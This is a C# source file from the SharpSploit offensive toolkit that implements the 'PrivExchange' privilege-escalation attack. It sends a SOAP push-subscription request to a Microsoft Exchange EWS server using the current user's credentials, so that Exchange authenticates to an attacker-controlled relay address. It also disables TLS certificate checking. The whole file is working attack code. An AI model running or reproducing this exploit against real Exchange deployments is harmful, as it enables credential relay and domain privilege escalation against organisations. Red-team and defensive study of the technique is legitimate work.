// Author: Ryan Cobb (@cobbr_io)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using System.IO;
using System.Net;
using System.Xml;

namespace SharpSploit.PrivilegeEscalation
{
    /// <summary>
    /// Exchange is a class for abusing Microsoft Exchange for privilege escalation.
    /// </summary>
    public class Exchange
    {
        /// <summary>
        /// Enum for varions versions of Microsoft Exchange
        /// </summary>
        public enum ExchangeVersion
        {
            /// <summary>Exchange 2007</summary>
            Exchange2007,
            /// <summary>Exchange 2007 SP1</summary>
            Exchange2007_SP1,
            /// <summary>Exchange 2010</summary>
            Exchange2010,
            /// <summary>Exchange 2010 SP1</summary>
            Exchange2010_SP1,
            /// <summary>Exchange 2010 SP2</summary>
            Exchange2010_SP2,
            /// <summary>Exchange 2013</summary>
            Exchange2013,
            /// <summary>Exchange 2013 SP1</summary>
            Exchange2013_SP1,
            /// <summary>Exchange 2016</summary>
            Exchange2016
        }

        /// <summary>
        /// Performs the "PrivExchange" attack to abuse Exchange EWS to subscribe to push notifications to relay the Exchange authentication.
        /// This attack relies on the use of a relay constructed outside of SharpSploit.
        /// </summary>
        /// <author>Dennis Panagiotopoulos (@den_n1s)</author>
        /// <param name="EWSUri">The URI of the Exchange EWS instance to perform the relay against. For example: http(s)://[hostname]:[port]/EWS/Exchange.asmx.</param>
        /// <param name="RelayUri">Set the attacker's IP.</param>
        /// <param name="ExchangeVersion">Microsoft Exchange version. Defaults to Exchange2010.</param>
        /// <returns>Bool. True if execution succeeds, false otherwise.</returns>
        /// <remarks>
        /// Credits to Dirk-jan Molemma (@_dirkjan) for the discovery of this attack and Dave Cossa (@G0ldenGunSec) for his PowerShell implementation.
        /// </remarks>
        public static bool PrivExchangePushNotification(string EWSUri, string RelayUri, ExchangeVersion ExchangeVersion = ExchangeVersion.Exchange2010)
        {
            XmlDocument soapEnvelopeXml = new XmlDocument();

            string soapRequestXML = String.Format(@"<?xml version=""1.0"" encoding=""utf-8""?>
            <soap:Envelope xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:t = ""http://schemas.microsoft.com/exchange/services/2006/types"" xmlns:m =""http://schemas.microsoft.com/exchange/services/2006/messages"">
            <soap:Header><t:RequestServerVersion Version=""{0}"" /></soap:Header >
            <soap:Body ><m:Subscribe><m:PushSubscriptionRequest SubscribeToAllFolders = ""true"">
                <t:EventTypes><t:EventType> NewMailEvent </t:EventType><t:EventType> ModifiedEvent </t:EventType><t:EventType> MovedEvent </t:EventType></t:EventTypes>
                <t:StatusFrequency> 1 </t:StatusFrequency ><t:URL> {1} </t:URL></m:PushSubscriptionRequest></m:Subscribe>
            </soap:Body>
            </soap:Envelope>", ExchangeVersion, RelayUri);

            soapEnvelopeXml.LoadXml(soapRequestXML);

            ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
            HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(EWSUri);
            request.ContentType = "text/xml;charset=\"utf-8\"";
            request.Method = "POST";
            request.UseDefaultCredentials = true;

            // Send request to Exchange EWS
            try
            {
                Console.WriteLine("Sending request to exchange server: {0}", EWSUri);
                Stream newStream = request.GetRequestStream();
                soapEnvelopeXml.Save(newStream);
                newStream.Close();
            }
            catch (WebException e)
            {
                Console.Error.WriteLine("Error: EWS Request unsuccessful: " + e.Message + Environment.NewLine + e.StackTrace);
                return false;
            }

            // Wait for response from Exchange EWS
            try
            {
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                StreamReader rd = new StreamReader(response.GetResponseStream());
                string xmlResult = rd.ReadToEnd();

                if (response.StatusCode == HttpStatusCode.OK)
                {
                    if (xmlResult.Contains("NoError"))
                    {
                        Console.WriteLine("Received HTTP Status Code: 200. Exchange server should authenticate soon.");
                        return true;
                    }
                    else if (xmlResult.Contains("ErrorMissingEmailAddress"))
                    {
                        Console.Error.WriteLine("Error: Current user does not have an email address associated with their account.");
                        return false;
                    }
                    else
                    {
                        Console.Error.WriteLine("Unknown error has occured. Attack was likely unsuccessful.");
                        return false;
                    }
                }
                else
                {
                    Console.Error.WriteLine("Invalid response received. Attack may have failed.");
                    return false;
                }
            }
            catch (WebException e)
            {
                Console.Error.WriteLine("Error: " + e.Message + Environment.NewLine + e.StackTrace);
                return false;
            }
        }
    }
}